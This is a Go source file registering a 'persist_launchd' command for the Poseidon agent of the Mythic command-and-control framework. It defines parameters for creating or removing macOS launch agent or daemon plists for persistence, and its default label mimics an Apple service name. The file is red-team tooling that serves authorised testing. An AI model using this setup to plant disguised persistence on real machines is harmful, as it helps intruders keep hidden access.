package agentfunctions

import (
	"errors"
	"fmt"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("poseidon").AddCommand(agentstructs.Command{
		Name:                "persist_launchd",
		Description:         "Create a launch agent or daemon plist file and save it to ~/Library/LaunchAgents or /Library/LaunchDaemons",
		HelpString:          "persist_launchd",
		Version:             1,
		Author:              "@xorrior",
		MitreAttackMappings: []string{"T1543.001", "T1543.004"},
		SupportedUIFeatures: []string{},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_MACOS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "args",
				ModalDisplayName: "Program Arguments",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_ARRAY,
				DefaultValue:     []string{},
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     1,
					},
				},
				Description: "List of arguments to execute in the ProgramArguments section of the PLIST",
			},
			{
				Name:          "KeepAlive",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				DefaultValue:  true,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     2,
					},
				},
				Description: "When this value is set to true, Launchd will restart the daemon if it dies",
			},
			{
				Name:          "RunAtLoad",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				DefaultValue:  false,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     3,
					},
				},
				Description: "When this value is set to true, Launchd will immediately start the daemon/agent once it has been registered",
			},
			{
				Name:          "Label",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:  "com.apple.mdmupdateagent",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     4,
					},
				},
				Description: "The label for launch persistence",
			},
			{
				Name:          "LaunchPath",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						UIModalPosition:     5,
					},
				},
				Description: "Path to save the new plist",
			},
			{
				Name:          "remove",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				DefaultValue:  false,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     6,
					},
				},
				Description: "Remove this persistence",
			},
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			label, err := taskData.Args.GetStringArg("Label")
			if err != nil {
				response.Success = false
				response.Error = err.Error()
				return response
			}
			path, err := taskData.Args.GetStringArg("LaunchPath")
			if err != nil {
				response.Success = false
				response.Error = err.Error()
				return response
			}
			remove, err := taskData.Args.GetBooleanArg("remove")
			if err != nil {
				response.Success = false
				response.Error = err.Error()
				return response
			}
			if remove {
				displayParams := fmt.Sprintf("removing %s at %s", label, path)
				response.DisplayParams = &displayParams
			} else {
				displayParams := fmt.Sprintf("%s at %s", label, path)
				response.DisplayParams = &displayParams
			}

			return response
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if len(input) > 0 {
				return args.LoadArgsFromJSONString(input)
			} else {
				return errors.New("Must supply arguments")
			}
		},
	})
}
